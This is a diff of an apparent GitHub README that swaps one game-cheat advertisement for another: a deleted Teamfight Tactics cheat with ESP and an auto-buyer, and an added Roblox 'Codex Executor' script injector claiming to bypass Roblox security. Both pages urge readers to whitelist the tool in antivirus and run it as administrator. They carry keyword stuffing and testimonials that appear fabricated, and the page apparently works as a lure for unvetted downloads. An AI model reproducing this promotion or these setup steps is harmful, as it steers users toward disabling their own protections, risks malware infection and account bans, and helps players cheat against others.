@@ -1,115 +1,79 @@
-# 🧠 TFT Cheat – Win Every Lobby with Auto Buy, Reroll & Board Tracker
+# Codex Executor📜
 
-**Tired of low rolls and weak comps? Want to climb fast without playing the RNG game? The ultimate TFT cheat gives you all the tools to dominate every match without breaking a sweat.**
+When Roblox players crave control, **Codex Executor** delivers. This script injector blends raw power with sleek design—letting you run LUA hubs, GUIs, and custom mods at full speed. Whether you’re farming, trolling, or flexing in PvP, Codex puts you in command.
 
-This cheat is built for **Teamfight Tactics** addicts who want full control over the board, shop, and enemy intel. From **auto-buying meta units** to **scouting opponents in real-time**, this tool eliminates luck and replaces it with pure power ⚡
+**Quick Links:** [Overview](#overview) • [Features](#feature-breakdown-) • [Install](#instant-install-guide)
 
-[![Download Cheat](https://img.shields.io/badge/Download-Cheat-blueviolet)](https://TFT-Cheat-Tool-l28y.github.io/.github)
----
+## Overview
 
-## 🎮 What Is the TFT Cheat?
+Codex Executor is built on a next-level injection engine that prioritizes **speed, safety, and stability**. It bypasses Roblox security while keeping LUA execution crisp and crash-free. Forget unstable loaders—Codex is coded to handle heavy hubs with ease.
+<img width="1200" height="700" alt="image" src="https://github.com/user-attachments/assets/791d115b-e6f8-42ba-b247-0c120c579ba8" />
 
-The **TFT Cheat** is a background-running tool designed to give players a massive advantage in every phase of the game. Whether you’re climbing ranked or farming missions, this tool automates key mechanics, reveals hidden info, and helps you build god-tier boards with near-zero effort.
+## Feature Breakdown 🛠️
 
-It’s not just a cheat – it’s like having a Challenger-level AI playing with you behind the scenes 🤖
+* 📜 **High-performance LUA executor**
+* 🛡️ Integrated **anti-ban stealth shield**
+* ⚡ Fast injection engine, no delays
+* 🎮 Compatible with most Roblox hubs & scripts
+* 🔥 Lightweight and resource-friendly
+* 🖥️ Modern UI overlay with simple controls
+<img width="1280" height="720" alt="image" src="https://github.com/user-attachments/assets/ebd98a3a-dcef-40e6-af56-262dee9c268d" />
 
----
+## Why Our Executor Obliterates the Competition 💥
 
-## 🔥 Cheat Features Breakdown
+Codex isn’t just another Roblox injector—it’s **an elite scripting engine**. With stability and stealth combined, it gives players the confidence to run advanced scripts without fear of lag or detection.
 
-### 🛒 **Auto Buyer**
+## System Requirements
 
-The tool instantly buys optimal champions based on your comp or chosen synergy. No more panic buying or missed 3-stars.
+* Windows 10/11
+* Roblox client (latest build)
+* .NET Framework installed
+* 4GB+ RAM minimum
 
-### 🔁 **Smart Shop Reroll**
 
-Custom reroll logic targets only what fits your board – saves gold, time, and wins rounds. Set thresholds or force reroll under X HP.
+## Community Feedback / Safety Tips 🛡️
 
-### 🧠 **Enemy Board Tracker**
+> “Codex handles big script hubs without a single crash. Smooth as butter.”
+>
+> “The anti-ban system feels strong—I’ve stayed undetected for weeks.”
 
-See what every player is building, how much gold they have, and what items they’re holding – in real-time. Perfect for positioning and pivoting.
+**Safety Tips:**
 
-### 🧩 **Item Optimizer**
+* Run as admin for best results
+* Whitelist Codex in your antivirus
+* Keep executor updated
+* Avoid VPNs during injection
 
-Suggests or auto-builds BIS (Best-in-Slot) items based on current comp and champ pool. Can also block troll items like double warmogs on a carry.
+## Patch Notes / Update Log
 
-### 🎯 **Auto Positioning System**
+* 2025-09-08: Improved LUA parsing for faster hubs
+* 2025-08-19: Upgraded anti-ban stealth shield
+* 2025-08-04: Fixed minor overlay bug
 
-Rearranges your board before each round to dodge hooks, AoE, and clumps. Auto-mirrors when it detects assassins or Zephyrs.
+## Conclusion 🎯
 
-### 📈 **XP & Econ Assistant**
+With **Codex Executor**, Roblox scripting hits a whole new level. Stable, fast, and secure—it’s the tool serious players rely on. If you want a **next-gen LUA injector**, Codex is the clear choice.
+<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/f9077b68-8a3a-4c59-a514-b8765a59454e" />
 
-Helps manage leveling timing and econ balancing to keep you at max power level with the least waste.
+**Keyword Cluster** — codex executor, roblox script executor, lua injector, exploit loader, roblox executor safe, codex hub compatible
 
-[Visit Official Site - wecheaters.com](https://wecheaters.com)
-[![Visit Official Site](https://i.ibb.co/hFTLN3XF/Frame-9.png)](https://wecheaters.com)
----
+## FAQ
 
-## ⚙️ Setup Instructions
+**Q1: Does Codex Executor support large script hubs?**
+Yes—Codex is optimized to handle heavy GUIs and universal hubs smoothly.
 
-1. Extract the cheat folder and add to antivirus whitelist
-2. Launch **TFT Injector** as administrator
-3. Open Teamfight Tactics through the League client
-4. Activate features via hotkeys or the overlay menu
-5. Jump in-game and let the cheat do the heavy lifting
+**Q2: Is Codex safe for Roblox?**
+It includes anti-ban stealth, but like all executors, use responsibly and stay updated.
 
-💡 *Optional: Use stealth mode for private lobbies or ranked games – keeps features running in the background with no visible UI.*
+**Q3: Can Codex run on low-end PCs?**
+Definitely. Its lightweight design ensures smooth performance even on modest hardware.
 
----
+**Q4: How often is Codex updated?**
+Regularly—new patches roll out to stay synced with Roblox updates.
 
-## 🖥️ System Requirements
+**Q5: What makes Codex better than rivals?**
+Its balance of **speed, stealth, and stability** makes it stand out.
 
-You don’t need a crazy setup. This tool runs light and smooth:
+## License
 
-* **OS:** Windows 10 or 11 (64-bit)
-* **CPU:** Dual-core or higher
-* **RAM:** 4GB+
-* **Storage:** \~100MB
-* **.NET Framework:** 4.8+
-* **GPU:** Integrated or better
-
-Compatible with current TFT sets and patches – gets updated regularly to stay working through client changes.
-
----
-
-## ⚔️ Cheat vs. Standard Gameplay
-
-| Feature          | TFT Cheat Tool | Manual Play | Tracker Addons |
-| ---------------- | -------------- | ----------- | -------------- |
-| Auto Buy Units   | ✅              | ❌           | ❌              |
-| Smart Rerolling  | ✅              | ❌           | ❌              |
-| Enemy Board ESP  | ✅              | ❌           | ⚠️ Partial     |
-| Item Optimizer   | ✅              | ⚠️ Manual   | ⚠️ Guides      |
-| Auto Positioning | ✅              | ❌           | ❌              |
-| Detection Rate   | 🔒 Very Low    | None        | ⚠️ Depends     |
-
-This cheat takes all the micromanagement off your hands and gives you **meta-perfect gameplay** round after round.
-
----
-
-## 📢 What Players Are Saying
-
-🗣️ “I was hardstuck Gold, and now I’m farming Masters with perfect items every game.”
-– @TFTClimberX
-
-🗣️ “The positioning bot saved me so many games – it literally dodges Blitz and Sej ults better than me.”
-– @AFKBrain
-
-🗣️ “Best tool for climbing on alt accounts fast. Feels like scripting but smarter.”
-– @CompBuilder420
-
----
-
-## ✅ Final Words
-
-The **TFT Cheat Tool** is for players who don’t want to pray for RNG – they want results. From fully automated buying and rerolling to ESP-style scouting and board optimizing, it removes the guesswork and gives you perfect control of every match.
-
-Whether you’re chasing ranked glory or farming missions on autopilot, this tool puts you 10 rounds ahead of the lobby – every single game 🔥
-
----
-
-## 🧷 Keywords
-
-TFT cheat, Teamfight Tactics cheat tool, TFT auto buyer, TFT smart reroll, TFT board ESP, TFT vision hack, Teamfight Tactics positioning bot, auto play TFT, TFT item optimizer, TFT shop hack, TFT XP bot, TFT macro cheat, undetected TFT cheat, TFT board scanner, cheat tool for Teamfight Tactics, TFT gameplay enhancer, auto TFT win, climb faster TFT, meta TFT tool
-
----
+MIT License
